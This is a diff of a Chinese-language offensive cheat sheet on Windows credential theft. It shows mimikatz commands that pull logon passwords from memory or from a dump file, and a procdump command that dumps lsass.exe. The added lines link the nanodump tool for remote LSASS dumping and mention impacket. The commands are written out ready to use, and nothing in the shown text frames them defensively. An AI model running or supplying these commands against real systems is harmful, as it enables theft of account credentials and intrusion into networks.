@@ -25,8 +25,16 @@ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
 
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
+
+
 回传本地获取密码
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
+
+## LSASS 转储
+
+   远程凭据提取：https://github.com/fortra/nanodump
+   
+   impacket包 ，也有windows的版本，查看我的其他项目，上传了。
 
 ## 解密码项目
 
